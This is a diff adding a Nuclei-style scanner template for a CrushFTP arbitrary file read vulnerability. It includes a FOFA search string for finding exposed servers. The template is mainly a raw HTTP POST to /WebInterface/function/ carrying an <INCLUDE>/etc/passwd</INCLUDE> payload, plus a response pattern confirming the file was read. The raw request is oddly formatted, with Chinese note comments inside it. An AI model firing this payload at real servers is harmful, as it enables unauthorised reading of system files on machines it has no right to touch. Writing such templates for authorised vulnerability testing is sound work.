@@ -1,0 +1,45 @@
+id: poc-gy1lglq4eotomatk
+info:
+  name: CrushFTP 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gy1lglq4eotomatk'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gy1lglq4eotomatk
+    fofa: title="CrushFTP"
+http:
+- raw:
+  - 'POST /WebInterface/function/ HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    Cookie: currentAuth=; CrushAuth=
+
+
+
+
+    command=exists&paths=<INCLUDE>/etc/passwd</INCLUDE>&random=0.5382052606828951&c2f=xxxx
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?root)(?=.*?bin).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
